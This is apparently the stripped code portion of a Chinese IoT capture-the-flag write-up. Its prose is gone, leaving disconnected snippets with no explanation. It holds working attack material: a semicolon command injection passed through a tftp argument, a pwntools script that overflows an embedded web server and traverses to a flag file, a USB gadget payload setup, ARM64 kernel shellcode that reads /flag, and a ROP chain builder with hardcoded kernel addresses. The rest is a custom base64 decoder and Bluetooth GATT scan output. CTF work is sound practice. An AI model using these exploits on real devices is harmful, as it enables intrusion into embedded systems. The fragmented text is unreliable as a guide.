```



```
if(c[idx] == '-' || c[idx] == ';' || c[idx] == '|' || c[idx] == '`' || c[idx] == '&' || c[idx] == '$' || c[idx] == '!' || c[idx] == '(' || c[idx] == ')' || c[idx] == ''' || c[idx] == '"'){ SIM_SYSLOG_OP("Illegal input!");return -1;        }
```



```
第一次：Acat /flag第二次：;
```



```
tftp -p -l /tmp/logs.txt -r /tmp/logs.txt ;cat /flag
```



```
# file thttpdthttpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=30fc332f1e5780c1c7e72cbd9070ab0c767bf3cf, with debug_info, not stripped
```



```
❯ ls -altotal 16drwxr-xr-x 1 iot iot 128 Mar 9 14:33 .drwxr-xr-x 1 iot iot 256 Mar 15 11:29 ..-rw-r--r-- 1 iot iot 19 Mar 9 14:33 .htpasswd-rw-r--r-- 1 iot iot 221 Mar 9 14:33 index.html❯ cat .htpasswd admin:tp2A/UzJN/Vr
```



```
/* Returns -1 == unauthorized, 0 == no auth file, 1 = authorized. */
```



```
Authorization: Basic $(var)
```



```
Authorization: Basic -====
```



```
#!/usr/bin/env python# encoding: utf-8from pwn import *import timecontext.log_level = 'debug'
# for hc->origfilename in a specific location url = '/'+'a'*0xC8Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()
# for &authpath chunk
url = '/index.html'Accept = 'b'AcceptE = 'c'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p = remote("20.21.2.27",80)p.send(payload)p.recv()

sleep(3)# for change hc->origfilenamep = remote("20.21.2.27",80)url = '/'Accept = 'b'AcceptE = 'c'*0x1468+'../../flag.txt'payload = ''payload += 'GET {} HTTP/1.1rn'.format(url)payload += 'Host: 127.0.0.1:80rn'payload += 'Authorization: Basic -====rn'payload += 'Accept: {}rn'.format(Accept)payload += 'Accept-Encoding: {}rnrn'.format(AcceptE)p.send(payload)p.recv()p.close()
```



```
for(;;){if(!PD2){ F_CPU-=10000; }else{ F_CPU=F_CPU; }}
```



```
data < -(k0, k1, k2...k6); r < -("_", ".")for i < - 0 to 6 MOSI_enc(r, data[i]) delay 350msend
```



```
.－－/./.－－－－/－.－./－－－－－/－－/.
```



```
def base64Decode(string): result = []string = string.strip("=") binstr = "" bin6list = [] bin8list = [] base64_list = "a0b1c2d3e4f5g6h7i8j9ZYXWVUTSRQPON+klmnopqrABCDEFGHIJKLM/stuvwxyz"
for ch in string: bin6list.append("{:>06}".format(str(bin(base64_list.index(ch)).replace("0b", ""))))
 binstr = "".join(bin6list)
for i in range(0, len(binstr), 8): bin8list.append(binstr[i:i + 8])
for item in range(len(bin8list) - 1): result.append(chr(int(bin8list[item], 2)))return "".join(result)print(base64Decode("UoH+U/D/U92lgdLnWMZIR/nOVo2JU9VKOi=="))
```



```
void sd_read_disk_check(struct scsi_disk *sdkp){struct scsi_sense_hdr sshdr;struct scsi_device *sdp = sdkp->device;unsigned char data_buffer[sdp->sector_size];unsigned char rdCmd[10] = {READ_10, 0, 0, 0, 0, 0, 0, 0, 0, 0};int i = 0;
char cap_str_10[10]; string_get_size(sdkp->capacity, sdp->sector_size, STRING_UNITS_10, cap_str_10, sizeof(cap_str_10)); sd_printk(KERN_NOTICE, sdkp,"size:%x,%x,%sn", sdkp->capacity, sdp->sector_size, cap_str_10);
if(sdkp->capacity*sdp->sector_size>10485760)return;
 rdCmd[2] = (unsigned char)((0 >> 24) & 0xff); rdCmd[3] = (unsigned char)((0 >> 16) & 0xff); rdCmd[4] = (unsigned char)((0 >> 8) & 0xff); rdCmd[5] = (unsigned char)(0 & 0xff); rdCmd[7] = (unsigned char)(((sdkp->capacity) >> 8) & 0xff); rdCmd[8] = (unsigned char)((sdkp->capacity) & 0xff);
int the_result = scsi_execute_req(sdp, rdCmd, DMA_FROM_DEVICE, data_buffer,1024, &sshdr, SD_TIMEOUT, SD_MAX_RETRIES, NULL);if (the_result > 0) { sd_printk(KERN_NOTICE, sdkp,"readerrorn"); }else { sd_printk(KERN_NOTICE, sdkp,"readsuccessn"); }return 0;}
```



```
rmmod g_ethermount none /sys/kernel/config -t configfsmkdir /sys/kernel/config/usb_gadget/g1cd /sys/kernel/config/usb_gadget/g1mkdir configs/c.1mkdir functions/mass_storage.usb0echo "/tmp/payload" > functions/mass_storage.usb0/lun.0/filemkdir strings/0x409mkdir configs/c.1/strings/0x409echo 0x1D6B > idVendorecho 0x0100 > idProductcd configs/c.1ln -s ../../functions/mass_storage.usb0/ .cd ../../echo "musb-hdrc.1.auto" > UDC
```



```
typedef long unsigned int size_t;typedef long long __kernel_loff_t;typedef __kernel_loff_t loff_t;
typedef void *(*FILP_OPEN)(const char *file);#define FILP_OPEN ((FILP_OPEN)0xffffff8008087a68)
typedef size_t (*VFS_READ)(void *file, char *buf, size_t count);#define VFS_READ ((VFS_READ)0xffffff8008087ab4)
typedef size_t (*VFS_WRITE)(void *file, char *buf, size_t count);#define VFS_WRITE ((VFS_WRITE)0xffffff8008087ad4)
typedef void (*SET_FS_KERNEL_TIPS)(void);#define SET_FS_KERNEL_TIPS ((SET_FS_KERNEL_TIPS)0xffffff8008087a84)
typedef void (*FSYNC_TIPS)(void *file);#define FSYNC_TIPS ((FSYNC_TIPS)0xffffff8008087af4)
typedef int (*PRINTK)(const char *fmt, ...);#define PRINTK ((PRINTK)0xffffff800811b374)
void _start(void){unsigned char buf_read[16];
void *fp1;void *fp2;loff_t pos1, pos2; PRINTK("start successnn"); SET_FS_KERNEL_TIPS();
 fp1 = FILP_OPEN("/dev/sda"); fp2 = FILP_OPEN("/flag");
 VFS_READ(fp2, buf_read, 16);int ret = VFS_WRITE(fp1, buf_read, 16); FSYNC_TIPS(fp1);}
```



```
#define _GNU_SOURCE#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <arpa/inet.h>#include <string.h>
#define ROP1 0xffffff80083e2e90#define ROP2 0xffffff800825fbe8#define ROP3 0xffffff80083e86fc#define memcpy_addr 0xffffff8008290e00#define buf_addr 0xffffff8000836000#define memcpy_num 0x500
int main(){ FILE *fp1; FILE *fp2;
 fp1 = fopen("payload", "w+");if (!fp1)return -1;
size_t rop[0x1000] = {0};int count = 0;memset(rop, 'a', 0x208); count += 0x208 / 8; rop[count++] = ROP1; rop[count++] = ROP2; rop[count++] = buf_addr; rop[count++] = ROP3;memset(rop + count, 'a', 0x48); count += 0x48 / 8; rop[count++] = memcpy_num; rop[count++] = memcpy_addr;memset(rop + count, 'a', 0x60); count += 0x60 / 8;
 fp2 = fopen("shellcode.bin", "r");if (!fp2)return -1;
 fseek(fp2, 0, SEEK_END);int len = ftell(fp2); fseek(fp2, 0, SEEK_SET);size_t *buffer = malloc(len); len = fread(buffer, sizeof(char), len, fp2);memcpy(rop + count, buffer, len); count += len / 8 + 1;if (count < 1024 / 8 + 1) {memset(rop + count, 'a', 1024 / 8 + 1 - count); count += 1024 / 8 + 1 - count; }
 fwrite(rop, sizeof(size_t), count, fp1);free(buffer); fclose(fp1); fclose(fp2);return 0;}
```



```
$ sudo bluescan -m leAddr: 40:0F:CA:5A:C3:09 Addr type: random
Connectable: TrueRSSI: -27 dBmGeneral Access Profile:Flags: LE General Discoverable ModeBR/EDR Not SupportedComplete Local Name: FlagInFlash
$ sudo bluescan -m gatt 40:0F:CA:5A:C3:09----------------GATT Scan Result----------------Number of services: 4

Service (0x0001 - 0x0001, 0 characteristics)DeclarationHandle: 0x0001Type: 2800 (Primary Service declaration)Value: 1801 (Generic Attribute)Permissions: Read (no authen/author)
Service (0x0002 - 0x0006, 2 characteristics)DeclarationHandle: 0x0002Type: 2800 (Primary Service declaration)Value: 1800 (Generic Access)Permissions: Read (no authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
Value declarationHandle: 0x0004Type: 2A00 (Device Name)Value: b'FlagInFlash'Permissions: Higher layer specific
Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
Value declarationHandle: 0x0006Type: 2A01 (Appearance)Value: b'x00x02'Permissions: Higher layer specific
Service (0x0007 - 0x0009, 1 characteristics)DeclarationHandle: 0x0007Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-FFFF-FFFFFFFFFFFF (Unknown)Permissions: Read (no authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
Value declarationHandle: 0x0009Type: 1111 (Unknown)Value: b'FFFFFF00CYW920819EVB-02'Permissions: Higher layer specific
Service (0xff00 - 0xff05, 2 characteristics)DeclarationHandle: 0xff00Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-8635-82AD38A1381F (Guess: WICED - OTA)Permissions: Read (no authen/author)
Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
DescriptorHandle: 0xff03Type: 2902 (Client Characteristic Configuration declaration)Value: b'x00x00'Permissions: Read (no authen/author), Write (higher layer specifies authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)Permissions: Read (no authen/author)
```



```
$ sudo bluescan -m gatt----------------GATT Scan Result----------------Number of services: 4

Service (0x0001 - 0x0001, 0 characteristics)DeclarationHandle: 0x0001Type: 2800 (Primary Service declaration)Value: 1801 (Generic Attribute)Permissions: Read (no authen/author)
Service (0x0002 - 0x0006, 2 characteristics)DeclarationHandle: 0x0002Type: 2800 (Primary Service declaration)Value: 1800 (Generic Access)Permissions: Read (no authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0x0003Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0004UUID: 2A00 (Device Name)Permissions: Read (no authen/author)
Value declarationHandle: 0x0004Type: 2A00 (Device Name)Value: b'FlagInFlash-Writeup'Permissions: Higher layer specific
Characteristic (0 descriptors)DeclarationHandle: 0x0005Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0006UUID: 2A01 (Appearance)Permissions: Read (no authen/author)
Value declarationHandle: 0x0006Type: 2A01 (Appearance)Value: b'x00x02'Permissions: Higher layer specific
Service (0x0007 - 0x0009, 1 characteristics)DeclarationHandle: 0x0007Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-FFFF-FFFFFFFFFFFF (Unknown)Permissions: Read (no authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0x0008Type: 2803 (Characteristic declaration)Value:Properties: ReadHandle: 0x0009UUID: 1111 (Unknown)Permissions: Read (no authen/author)
Value declarationHandle: 0x0009Type: 1111 (Unknown)Value: b'flag{sEcvRe_yOur_oTA!}'Permissions: Higher layer specific
Service (0xff00 - 0xff05, 2 characteristics)DeclarationHandle: 0xff00Type: 2800 (Primary Service declaration)Value: AE5D1E47-5C13-43A0-8635-82AD38A1381F (Guess: WICED - OTA)Permissions: Read (no authen/author)
Characteristic (1 descriptors)DeclarationHandle: 0xff01Type: 2803 (Characteristic declaration)Value:Properties: Indicate, Notify, WriteHandle: 0xff02UUID: A3DD50BF-F7A7-4E99-838E-570A086C661B (Guess: WICED - OTA Control Point)Permissions: Read (no authen/author)
DescriptorHandle: 0xff03Type: 2902 (Client Characteristic Configuration declaration)Value: b'x00x00'Permissions: Read (no authen/author), Write (higher layer specifies authen/author)
Characteristic (0 descriptors)DeclarationHandle: 0xff04Type: 2803 (Characteristic declaration)Value:Properties: WriteHandle: 0xff05UUID: A2E86C7A-D961-4091-B74F-2409E72EFE26 (Guess: WICED - OTA Data)        Permissions: Read (no authen/author)
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/1-1647520721.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/6-1647520724.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/9-1647520724.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/7-1647520726.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/4-1647520727.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/7-1647520728.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/4-1647520730.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/5-1647520731.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/8-1647520732.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2022/03/3-1647520733.png)